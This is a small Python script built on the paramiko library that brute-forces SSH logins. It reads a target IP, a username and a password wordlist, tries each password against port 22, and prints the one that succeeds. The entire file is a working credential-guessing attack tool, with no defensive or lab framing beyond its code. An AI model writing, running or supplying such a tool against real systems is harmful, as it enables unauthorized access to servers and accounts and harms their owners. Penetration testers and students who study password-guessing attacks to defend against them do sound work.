from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
from argparse import ArgumentParser, Namespace
from time import perf_counter 
from colorama import Fore
from typing import Tuple

def parse_arguments() -> Tuple[str, str, str, str]:
    parser = ArgumentParser()
    parser.add_argument('IP', help='target IP address')
    parser.add_argument('username', help='ssh username')
    parser.add_argument('wordlist', help='passwords wordlist')
    parser.add_argument('-v', '--verbose', help='verbose mode', action='store_true')
    args = parser.parse_args()
    return args.IP, args.username, args.wordlist, args.verbose

def ssh_connect(password: str, code: int =0) -> int:
    global wait_time
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    if verbose:
        print(f'Trying {password}')
    try:
        ssh.connect(target, port=22, username=username, password=password)
    except AuthenticationException:
        code = 1

        
    ssh.close()
    if code == 0:
        print(f'{Fore.BLUE}password found: {Fore.RED}{password}{Fore.RESET}')
        exit(0)
    elif code == 1 and verbose: 
        print('no luck')



if __name__ == '__main__':
    print('started now')
    start = perf_counter()
    target, username, password_file, verbose = parse_arguments()
    
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
            
            try:
                ssh_connect(password)
            except Exception as e:
                print(e)
            pass
        

    